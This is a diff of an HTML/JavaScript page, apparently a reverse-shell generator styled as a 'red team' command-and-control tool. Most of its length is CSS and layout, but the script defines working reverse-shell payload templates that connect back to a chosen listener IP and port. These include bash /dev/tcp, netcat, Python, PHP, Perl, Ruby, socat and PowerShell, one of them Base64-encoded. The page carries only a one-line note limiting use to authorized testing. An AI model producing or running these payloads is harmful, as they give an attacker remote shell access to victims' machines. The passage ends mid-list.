@@ -3,598 +3,698 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reverse Shell Generator</title>
+    <title>Reverse Shell Generator | Premium Red Team Edition</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap');
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
         :root {
-            --bg: #0a0a0a;
-            --surface: #111111;
-            --surface-2: #1a1a1a;
-            --border: #2a2a2a;
-            --green: #00ff41;
-            --green-dim: #00cc33;
-            --red: #ff0040;
-            --purple: #7c3aed;
-            --cyan: #00d4ff;
-            --text: #e0e0e0;
-            --text-dim: #888;
-            --glow: 0 0 20px rgba(0, 255, 65, 0.15);
+            --bg: #030712;
+            --surface: rgba(17, 24, 39, 0.7);
+            --surface-hover: rgba(31, 41, 55, 0.8);
+            --border: rgba(255, 255, 255, 0.08);
+            --border-accent: rgba(16, 185, 129, 0.3);
+            --primary: #10b981; /* Emerald 500 */
+            --primary-glow: rgba(16, 185, 129, 0.2);
+            --secondary: #6366f1; /* Indigo 500 */
+            --danger: #ef4444; /* Red 500 */
+            --warning: #f59e0b; /* Amber 500 */
+            --text: #f9fafb;
+            --text-dim: #9ca3af;
+            --font-main: 'Plus Jakarta Sans', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
         }
-        
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: var(--font-main);
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
-            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 0% 0%, rgba(16, 185, 129, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 100% 100%, rgba(99, 102, 241, 0.05) 0%, transparent 50%);
+            background-attachment: fixed;
+            line-height: 1.5;
         }
 
-        /* Matrix rain background */
-        .matrix-bg {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 0;
-            opacity: 0.03;
-            pointer-events: none;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(0, 255, 65, 0.03) 2px,
-                rgba(0, 255, 65, 0.03) 4px
-            );
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 10px;
         }
+        ::-webkit-scrollbar-thumb:hover { background: var(--border-accent); }
 
-        .container {
-            max-width: 960px;
-            margin: 0 auto;
-            padding: 30px 20px;
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Header */
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding: 30px;
-            background: linear-gradient(135deg, rgba(0, 255, 65, 0.05), rgba(124, 58, 237, 0.05));
-            border: 1px solid var(--border);
-            border-radius: 16px;
-        }
-
-        .header h1 {
-            font-family: 'Fira Code', monospace;
-            font-size: 2rem;
-            color: var(--green);
-            text-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
-            margin-bottom: 8px;
-        }
-
-        .header h1 span { color: var(--red); }
-
-        .header p {
-            color: var(--text-dim);
-            font-size: 0.9rem;
-        }
-
-        .disclaimer {
-            background: rgba(255, 0, 64, 0.08);
-            border: 1px solid rgba(255, 0, 64, 0.2);
-            border-radius: 8px;
-            padding: 10px 16px;
-            margin-top: 16px;
-            font-size: 0.75rem;
-            color: var(--red);
-            font-family: 'Fira Code', monospace;
-        }
-
-        /* Config Section */
-        .config {
+        .app-layout {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            margin-bottom: 30px;
-        }
-
-        .input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-
-        .input-group label {
-            font-family: 'Fira Code', monospace;
-            font-size: 0.75rem;
-            color: var(--green);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .input-group input, .input-group select {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 16px;
-            color: var(--text);
-            font-family: 'Fira Code', monospace;
-            font-size: 0.9rem;
-            outline: none;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus, .input-group select:focus {
-            border-color: var(--green);
-            box-shadow: var(--glow);
-        }
-
-        .input-group select { cursor: pointer; }
-        .input-group select option { background: var(--surface); }
-
-        /* Shell Cards */
-        .shells-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .shell-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 12px;
+            grid-template-columns: 280px 1fr;
+            height: 100vh;
             overflow: hidden;
-            transition: all 0.3s;
         }
 
-        .shell-card:hover {
-            border-color: var(--green-dim);
-            box-shadow: var(--glow);
+        /* Sidebar */
+        .sidebar {
+            background: rgba(3, 7, 18, 0.95);
+            border-right: 1px solid var(--border);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            overflow-y: auto;
         }
 
-        .shell-header {
+        .brand {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            padding: 12px 20px;
-            background: var(--surface-2);
-            border-bottom: 1px solid var(--border);
+            gap: 12px;
+            margin-bottom: 12px;
         }
 
-        .shell-title {
+        .brand-logo {
+            width: 32px;
+            height: 32px;
+            background: var(--primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .brand-logo svg {
+            width: 20px;
+            height: 20px;
+            stroke: white;
+            stroke-width: 2.5;
+        }
+
+        .brand-name {
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: -0.02em;
+        }
+
+        .nav-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .nav-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--text-dim);
+            margin-bottom: 8px;
+            padding-left: 12px;
+        }
+
+        .nav-item {
+            padding: 10px 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--text-dim);
+            cursor: pointer;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             gap: 10px;
         }
 
-        .shell-lang {
-            font-family: 'Fira Code', monospace;
-            font-weight: 600;
-            font-size: 0.9rem;
-            color: var(--green);
+        .nav-item:hover {
+            background: var(--surface);
+            color: var(--text);
         }
 
-        .shell-badge {
-            font-size: 0.65rem;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-family: 'Fira Code', monospace;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        .nav-item.active {
+            background: var(--surface);
+            color: var(--primary);
+            border: 1px solid var(--border-accent);
         }
 
-        .badge-tcp { background: rgba(0, 255, 65, 0.1); color: var(--green); border: 1px solid rgba(0, 255, 65, 0.2); }
-        .badge-web { background: rgba(124, 58, 237, 0.1); color: var(--purple); border: 1px solid rgba(124, 58, 237, 0.2); }
-        .badge-win { background: rgba(0, 212, 255, 0.1); color: var(--cyan); border: 1px solid rgba(0, 212, 255, 0.2); }
+        /* Main Content */
+        .main-content {
+            padding: 32px;
+            overflow-y: auto;
+            position: relative;
+        }
 
-        .copy-btn {
-            background: transparent;
-            border: 1px solid var(--border);
+        .header-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .page-title h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .page-title p {
             color: var(--text-dim);
-            padding: 6px 14px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Config Card */
+        .config-card {
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 32px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .input-group label {
             font-size: 0.75rem;
-            transition: all 0.3s;
+            font-weight: 600;
+            color: var(--text-dim);
+            text-transform: uppercase;
+        }
+
+        .input-group input, .input-group select {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 10px 14px;
+            color: var(--text);
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus, .input-group select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--primary-glow);
+        }
+
+        /* Shell Grid */
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 20px;
+        }
+
+        .payload-card {
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            overflow: hidden;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .payload-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--border-accent);
+            box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-header {
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .card-title {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 10px;
         }
 
-        .copy-btn:hover { border-color: var(--green); color: var(--green); }
+        .card-title h3 {
+            font-size: 0.95rem;
+            font-weight: 600;
+        }
+
+        .badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge-primary { background: rgba(16, 185, 129, 0.1); color: var(--primary); border: 1px solid rgba(16, 185, 129, 0.2); }
+        .badge-secondary { background: rgba(99, 102, 241, 0.1); color: var(--secondary); border: 1px solid rgba(99, 102, 241, 0.2); }
+        .badge-warning { background: rgba(245, 158, 11, 0.1); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.2); }
+
+        .card-body {
+            position: relative;
+            padding: 16px 20px;
+        }
+
+        .code-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 16px;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: #d1d5db;
+            line-height: 1.6;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            word-break: break-all;
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            color: var(--text-dim);
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
 
         .copy-btn.copied {
-            border-color: var(--green);
-            color: var(--green);
-            background: rgba(0, 255, 65, 0.1);
+            background: var(--primary);
+            color: white;
         }
 
-        .shell-code {
-            padding: 16px 20px;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.82rem;
-            line-height: 1.6;
-            color: #c9d1d9;
-            white-space: pre-wrap;
-            word-break: break-all;
-            overflow-x: auto;
+        /* Search Bar */
+        .search-container {
+            position: relative;
+            width: 300px;
         }
 
-        .shell-code .highlight-ip { color: var(--red); font-weight: 600; }
-        .shell-code .highlight-port { color: var(--cyan); font-weight: 600; }
-
-        /* Category Headers */
-        .category {
-            margin-top: 24px;
-            margin-bottom: 12px;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--border);
+        .search-container input {
+            width: 100%;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 10px 14px 10px 40px;
+            color: var(--text);
+            font-size: 0.9rem;
+            outline: none;
         }
 
-        .category h2 {
-            font-family: 'Fira Code', monospace;
-            font-size: 0.85rem;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .search-container svg {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            stroke: var(--text-dim);
         }
 
-        .category h2 span { color: var(--green); }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            color: var(--text-dim);
-            font-size: 0.8rem;
-            border-top: 1px solid var(--border);
+        /* Notification */
+        #notification {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--primary);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.4);
+            transform: translateY(100px);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 1000;
         }
 
-        .footer a {
-            color: var(--green);
-            text-decoration: none;
+        #notification.show {
+            transform: translateY(0);
         }
 
         /* Responsive */
+        @media (max-width: 1100px) {
+            .app-layout { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+            .payload-grid { grid-template-columns: 1fr; }
+            .config-card { grid-template-columns: 1fr 1fr; }
+        }
+
         @media (max-width: 640px) {
-            .config { grid-template-columns: 1fr; }
-            .header h1 { font-size: 1.4rem; }
+            .config-card { grid-template-columns: 1fr; }
+            .header-bar { flex-direction: column; align-items: flex-start; gap: 20px; }
+            .search-container { width: 100%; }
         }
     </style>
 </head>
 <body>
-    <div class="matrix-bg"></div>
-    <div class="container">
-        <div class="header">
-            <h1>$ reverse<span>_</span>shell<span>.</span>gen</h1>
-            <p>Generate reverse shell payloads instantly. One-click copy. Zero install.</p>
-            <div class="disclaimer">
-                &#9888; For authorized penetration testing and educational purposes only.
+    <div class="app-layout">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="brand">
+                <div class="brand-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                </div>
+                <div class="brand-name">RS-GEN PRO</div>
             </div>
-        </div>
 
-        <div class="config">
-            <div class="input-group">
-                <label>&#9654; Listener IP</label>
-                <input type="text" id="ip" value="10.10.14.1" placeholder="Your IP address">
-            </div>
-            <div class="input-group">
-                <label>&#9654; Listener Port</label>
-                <input type="number" id="port" value="4444" placeholder="Port number">
-            </div>
-            <div class="input-group">
-                <label>&#9654; Shell Type</label>
-                <select id="shellType">
-                    <option value="/bin/sh">/bin/sh</option>
-                    <option value="/bin/bash" selected>/bin/bash</option>
-                    <option value="/bin/zsh">/bin/zsh</option>
-                    <option value="cmd.exe">cmd.exe</option>
-                    <option value="powershell">powershell</option>
-                </select>
-            </div>
-            <div class="input-group">
-                <label>&#9654; Encoding</label>
-                <select id="encoding">
-                    <option value="none" selected>None</option>
-                    <option value="base64">Base64</option>
-                    <option value="url">URL Encode</option>
-                </select>
-            </div>
-        </div>
+            <nav class="nav-group">
+                <div class="nav-label">Platforms</div>
+                <div class="nav-item active" onclick="filterBy('all')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                    All Systems
+                </div>
+                <div class="nav-item" onclick="filterBy('Linux')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                    Linux / Unix
+                </div>
+                <div class="nav-item" onclick="filterBy('Windows')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 3h18v18H3z"/><line x1="12" y1="3" x2="12" y2="21"/><line x1="3" y1="12" x2="21" y2="12"/></svg>
+                    Windows
+                </div>
+                <div class="nav-item" onclick="filterBy('Web')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                    Web / Scripting
+                </div>
+            </nav>
 
-        <div class="shells-grid" id="shellsContainer"></div>
+            <nav class="nav-group">
+                <div class="nav-label">Utilities</div>
+                <div class="nav-item" onclick="filterBy('Listener')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12"/><path d="M12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6"/><path d="M12 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2"/></svg>
+                    Listeners
+                </div>
+                <div class="nav-item" onclick="filterBy('Upgrade')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg>
+                    Shell Upgrade
+                </div>
+            </nav>
+        </aside>
 
-        <div class="footer">
-            Built with &#9760; by <a href="https://github.com/geevarghesekthomas84-sys" target="_blank">Gg</a>
-            &nbsp;|&nbsp; <a href="https://github.com/geevarghesekthomas84-sys/reverse-shell-generator" target="_blank">Star on GitHub</a>
-        </div>
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="header-bar">
+                <div class="page-title">
+                    <h1>Command & Control Generator</h1>
+                    <p>Premium grade reverse shell payloads for authorized operations.</p>
+                </div>
+                <div class="search-container">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                    <input type="text" id="search" placeholder="Search payloads (e.g. bash, python)..." oninput="searchPayloads()">
+                </div>
+            </header>
+
+            <section class="config-card">
+                <div class="input-group">
+                    <label>Listener Host</label>
+                    <input type="text" id="ip" value="10.10.14.1" placeholder="10.10.14.1">
+                </div>
+                <div class="input-group">
+                    <label>Listener Port</label>
+                    <input type="number" id="port" value="4444" placeholder="4444">
+                </div>
+                <div class="input-group">
+                    <label>Shell Interpreter</label>
+                    <select id="shellType">
+                        <option value="/bin/sh">/bin/sh</option>
+                        <option value="/bin/bash" selected>/bin/bash</option>
+                        <option value="/bin/zsh">/bin/zsh</option>
+                        <option value="powershell.exe">powershell.exe</option>
+                        <option value="cmd.exe">cmd.exe</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Output Encoding</label>
+                    <select id="encoding">
+                        <option value="none">Raw Text</option>
+                        <option value="base64">Base64</option>
+                        <option value="url">URL Encoded</option>
+                        <option value="powershell">PS EncodedCommand</option>
+                    </select>
+                </div>
+            </section>
+
+            <div class="payload-grid" id="payloadContainer">
+                <!-- Payloads generated by JS -->
+            </div>
+        </main>
     </div>
 
+    <div id="notification">Payload copied to clipboard!</div>
+
     <script>
-        const shells = [
+        const payloads = [
             {
-                category: "Linux / Unix",
-                items: [
-                    {
-                        name: "Bash -i",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`
-                    },
-                    {
-                        name: "Bash Read Line",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&1 | tee >(cat >&5); done`
-                    },
-                    {
-                        name: "Bash 196",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${shell} <&196 >&196 2>&196`
-                    },
-                    {
-                        name: "Bash UDP",
-                        badge: "tcp", badgeText: "UDP",
-                        template: (ip, port, shell) => `${shell} -i >& /dev/udp/${ip}/${port} 0>&1`
-                    }
-                ]
+                name: "Bash -i",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `${shell} -i >& /dev/tcp/${ip}/${port} 0>&1`
             },
             {
-                category: "Netcat",
-                items: [
-                    {
-                        name: "Netcat -e",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `nc ${ip} ${port} -e ${shell}`
-                    },
-                    {
-                        name: "Netcat -c",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `nc -c ${shell} ${ip} ${port}`
-                    },
-                    {
-                        name: "Netcat FIFO",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`
-                    },
-                    {
-                        name: "Ncat (SSL)",
-                        badge: "tcp", badgeText: "SSL",
-                        template: (ip, port, shell) => `ncat --ssl ${ip} ${port} -e ${shell}`
-                    }
-                ]
+                name: "Bash exec",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&1 | tee >(cat >&5); done`
             },
             {
-                category: "Python",
-                items: [
-                    {
-                        name: "Python3 Short",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])'`
-                    },
-                    {
-                        name: "Python3 PTY",
-                        badge: "tcp", badgeText: "PTY",
-                        template: (ip, port, shell) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${shell}")'`
-                    },
-                    {
-                        name: "Python3 Spawn",
-                        badge: "tcp", badgeText: "SPAWN",
-                        template: (ip, port, shell) => `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`
-                    }
-                ]
+                name: "Bash 196",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${shell} <&196 >&196 2>&196`
             },
             {
-                category: "PHP",
-                items: [
-                    {
-                        name: "PHP exec",
-                        badge: "web", badgeText: "WEB",
-                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`
-                    },
-                    {
-                        name: "PHP proc_open",
-                        badge: "web", badgeText: "WEB",
-                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${shell}",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`
-                    },
-                    {
-                        name: "PHP popen",
-                        badge: "web", badgeText: "WEB",
-                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});popen("${shell} <&3 >&3 2>&3","r");'`
-                    }
-                ]
+                name: "Netcat traditional",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `nc ${ip} ${port} -e ${shell}`
             },
             {
-                category: "PowerShell (Windows)",
-                items: [
-                    {
-                        name: "PowerShell #1",
-                        badge: "win", badgeText: "WIN",
-                        template: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
-                    },
-                    {
-                        name: "PowerShell #2",
-                        badge: "win", badgeText: "WIN",
-                        template: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$snb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$client.Close()"`
-                    },
-                    {
-                        name: "PowerShell Base64",
-                        badge: "win", badgeText: "B64",
-                        template: (ip, port) => {
-                            const cmd = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-                            return `powershell -e ${btoa(cmd)}`;
-                        }
-                    }
-                ]
+                name: "Netcat OpenBSD",
+                platform: "Linux",
+                badge: "FIFO",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`
             },
             {
-                category: "Perl",
-                items: [
-                    {
-                        name: "Perl",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
-                    },
-                    {
-                        name: "Perl no sh",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
-                    }
-                ]
+                name: "Python3",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("${shell}")'`
             },
             {
-                category: "Ruby",
-                items: [
-                    {
-                        name: "Ruby",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port, shell) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`
-                    },
-                    {
-                        name: "Ruby no sh",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444 cd\\s+(.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$!}"}'`
-                    }
-                ]
+                name: "Python3 Export",
+                platform: "Linux",
+                badge: "PTY",
+                badgeClass: "badge-secondary",
+                template: (ip, port, shell) => `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`
             },
             {
-                category: "Socat",
-                items: [
-                    {
-                        name: "Socat #1",
-                        badge: "tcp", badgeText: "TCP",
-                        template: (ip, port) => `socat TCP:${ip}:${port} EXEC:${document.getElementById('shellType').value},pty,stderr,setsid,sigint,sane`
-                    },
-                    {
-                        name: "Socat Listener",
-                        badge: "tcp", badgeText: "LISTEN",
